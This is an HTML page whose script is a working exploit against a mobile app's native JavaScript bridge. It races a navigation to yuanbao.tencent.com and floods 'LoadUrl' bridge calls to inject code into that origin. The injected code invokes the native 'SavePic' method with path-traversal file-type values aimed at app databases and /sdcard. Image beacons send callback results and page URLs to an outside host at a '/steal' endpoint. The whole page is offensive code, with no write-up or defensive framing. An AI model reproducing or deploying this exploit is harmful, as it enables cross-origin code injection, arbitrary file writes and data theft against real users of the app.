<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>race_sp_init</title></head>
<body>
<h2>Race SavePic - Static</h2>
<pre id="log" style="font-size:10px;white-space:pre-wrap;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s){ log.textContent += '['+Date.now()+'] '+s+'\n'; }

var EXFIL='https://test2.lleavesg.top/steal';

// 在 yuanbao.tencent.com 上下文里执行的 JS — 全部静态拼接，没有 forEach/模板
// 1) 改 document.title 让 race 命中可见
// 2) 注册几个命名回调，收到时各自把 code 拼进 title
// 3) 顺序调 5 个 SavePic（baseline + 4 个穿越变体）
var js = 'javascript:void(' +
    'document.title="RACE_OK",' +
    'window.savePicCallback=function(a){try{document.title="SPCB:"+(typeof a==="string"?a:JSON.stringify(a)).slice(0,60);new Image().src="'+EXFIL+'?t=spcb&r="+encodeURIComponent((typeof a==="string"?a:JSON.stringify(a)).slice(0,500))}catch(e){}},'+
    'window.cb_base=function(a){try{document.title="B:"+(typeof a==="string"?a:JSON.stringify(a)).slice(0,50);new Image().src="'+EXFIL+'?t=cb&k=baseline&r="+encodeURIComponent((typeof a==="string"?a:JSON.stringify(a)).slice(0,300))}catch(e){}},'+
    'window.cb_2up=function(a){try{document.title="2U:"+(typeof a==="string"?a:JSON.stringify(a)).slice(0,50);new Image().src="'+EXFIL+'?t=cb&k=two_up&r="+encodeURIComponent((typeof a==="string"?a:JSON.stringify(a)).slice(0,300))}catch(e){}},'+
    'window.cb_3up=function(a){try{document.title="3U:"+(typeof a==="string"?a:JSON.stringify(a)).slice(0,50);new Image().src="'+EXFIL+'?t=cb&k=three_up&r="+encodeURIComponent((typeof a==="string"?a:JSON.stringify(a)).slice(0,300))}catch(e){}},'+
    'window.cb_abs=function(a){try{document.title="AB:"+(typeof a==="string"?a:JSON.stringify(a)).slice(0,50);new Image().src="'+EXFIL+'?t=cb&k=abs&r="+encodeURIComponent((typeof a==="string"?a:JSON.stringify(a)).slice(0,300))}catch(e){}},'+
    'window.cb_db=function(a){try{document.title="DB:"+(typeof a==="string"?a:JSON.stringify(a)).slice(0,50);new Image().src="'+EXFIL+'?t=cb&k=db&r="+encodeURIComponent((typeof a==="string"?a:JSON.stringify(a)).slice(0,300))}catch(e){}},'+

    'new Image().src="'+EXFIL+'?t=jsrun&url="+encodeURIComponent(location.href),'+

    'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_base","module":"CommonPlugin","method":"SavePic","param":{"url":"https://www.baidu.com/img/flexible/logo/pc/result.png","type":"png"},"callId":"sp1"}\'),'+
    'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_2up","module":"CommonPlugin","method":"SavePic","param":{"url":"https://www.baidu.com/img/flexible/logo/pc/result.png","type":"png/../../savepic_mark_2up"},"callId":"sp2"}\'),'+
    'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_3up","module":"CommonPlugin","method":"SavePic","param":{"url":"https://www.baidu.com/img/flexible/logo/pc/result.png","type":"png/../../../savepic_mark_3up"},"callId":"sp3"}\'),'+
    'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_abs","module":"CommonPlugin","method":"SavePic","param":{"url":"https://www.baidu.com/img/flexible/logo/pc/result.png","type":"/sdcard/Download/savepic_mark_abs"},"callId":"sp4"}\'),'+
    'JSCallJavaMgr.JSCallNative(\'{"callback":"cb_db","module":"CommonPlugin","method":"SavePic","param":{"url":"https://www.baidu.com/img/flexible/logo/pc/result.png","type":"png/../../../databases/savepic_mark_db"},"callId":"sp5"}\')'+
')';

var c=0;
function sendOne(){
    c++;
    var req='{"callback":"cb_load_'+c+'","module":"CommonPlugin","method":"LoadUrl","param":{"url":"'+js.replace(/\\/g,'\\\\').replace(/"/g,'\\"')+'"},"callId":"c'+c+'"}';
    JSCallJavaMgr.JSCallNative(req);
}

function doRace(){
    if(!window.JSCallJavaMgr){addLog('NO BRIDGE');return;}
    addLog('bridge OK, url='+location.href);
    addLog('js payload len='+js.length);

    try{new Image().src=EXFIL+'?t=start&len='+js.length;}catch(e){}

    location.href="https://yuanbao.tencent.com/";

    for(var i=0;i<500;i++){ try{sendOne();}catch(e){break;} }
    for(var d=0;d<=500;d+=50){
        (function(delay){
            setTimeout(function(){
                for(var j=0;j<50;j++){ try{sendOne();}catch(e){return;} }
            },delay);
        })(d);
    }
    addLog('Phase1 fired: '+c);
}

setTimeout(function(){ addLog('2s...'); setTimeout(doRace,2000); },500);
</script>
</body>
</html>
